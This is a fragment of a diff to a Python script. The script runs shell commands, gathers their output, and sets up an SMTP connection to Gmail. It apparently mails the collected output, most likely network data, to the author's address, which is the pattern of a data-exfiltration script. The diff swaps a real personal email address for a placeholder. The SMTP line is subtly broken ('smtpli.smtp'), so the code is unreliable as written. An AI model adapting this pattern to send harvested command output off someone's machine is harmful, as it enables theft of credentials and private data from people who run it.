@@ -13,8 +13,8 @@ def main():
                     one_network_result = subprocess.check_output(command2, shell=True)
                     final_output += one_network_result
 
-                my_email = "maiquelgoelzer@gmail.com"
-                email = "maiquelgoelzer@gmail.com"
+                my_email = "xxxxxxxxxx@gmail.com"
+                email = "xxxxxxxxxx@gmail.com"
                 password = ""
 
                 server = smtpli.smtp("smtp.gmail.com", 587)
